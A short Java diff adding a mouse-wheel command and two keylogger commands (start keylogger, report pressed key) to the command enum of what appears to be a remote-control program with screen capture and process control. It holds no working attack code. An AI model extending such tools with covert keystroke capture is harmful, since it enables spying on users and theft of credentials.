@@ -7,6 +7,7 @@ public enum Commands {
 	RELEASE_KEY(-4),
 	MOVE_MOUSE(-5),
 	CLICK_MOUSE(-6),
+	MOUSE_WHEEL(-50),
 	SEND_SCREEN(-7),
 	INFOR_SCREEN(-8),
 	SIZE_SERVER(-9),
@@ -20,7 +21,9 @@ public enum Commands {
 	ERROR_PROCESS(-18),	
 	REQUEST_STOP_PROCESS(-19),
 	REQUEST_SCREEN_SHOT(-20),
-	RESPONSE_SCREEN_SHOT(-21);
+	RESPONSE_SCREEN_SHOT(-21),
+	REQUEST_START_KEYLOGGER(-22),
+	PRESS_KEY_KEYLOGGER(-23);
 	private int abbrev;
 
 	Commands(int abbrev){
